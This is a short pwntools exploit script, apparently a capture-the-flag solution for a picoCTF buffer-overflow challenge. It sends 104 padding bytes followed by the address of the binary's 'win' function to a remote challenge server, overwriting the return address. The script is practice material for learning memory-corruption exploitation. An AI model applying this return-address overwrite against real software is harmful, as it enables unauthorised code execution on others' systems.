from pwn import *

context.binary = elf = ELF('./vuln')
context.log_level = 'info'

p = remote('saturn.picoctf.net', 58295) #Specific to CTF

p.recv()

offset = 104 #buffer + 4 for EBP (EBP is always hard coded 4) and will also need 

win_address = elf.symbols['win'] #win



payload = flat(
    b'A' * offset,
    win_address, #Specific to CTF
    #0xdeadbeef
    #0xCAFEF00D
    #0xF00DF00D
  )

p.sendline(payload)

p.interactive()